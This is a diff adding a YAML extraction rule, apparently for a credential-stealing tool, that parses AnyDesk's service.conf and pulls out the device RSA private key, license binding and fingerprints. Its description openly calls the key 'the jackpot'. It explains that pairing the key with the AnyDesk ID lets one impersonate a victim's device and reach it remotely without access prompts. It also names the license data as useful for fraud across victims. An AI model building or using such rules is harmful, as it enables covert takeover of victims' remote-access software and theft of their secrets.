@@ -1,0 +1,27 @@
+id: anydesk_service_conf
+version: 1
+layer: content
+family: anydesk
+priority: 90
+path_glob: "**service.conf"
+description: >
+  AnyDesk installed-service state. Keyvalue '=' separator. The jackpot
+  key is ad.anynet.pkey, the DEVICE RSA PRIVATE KEY stored as a PEM
+  block with literal \\n line-escapes. Pair with ad.anynet.id from
+  system.conf to impersonate the victim's AnyDesk device on the
+  anynet without ever triggering unattended-access prompts.
+
+  ad.license.state_store is the signed license binding (hex blob);
+  useful for license fraud correlation across victims.
+match:
+  type: keyvalue
+  separator: "="
+  strip_whitespace: true
+  requires_keys:
+    - ad.anynet.pkey
+extract:
+  keys:
+    ad.anynet.pkey: anynet_private_key_pem
+    ad.license.state_store: license_state_store
+    ad.anynet.client_stats_hash: client_stats_hash
+    ad.anynet.fpr: service_fingerprint
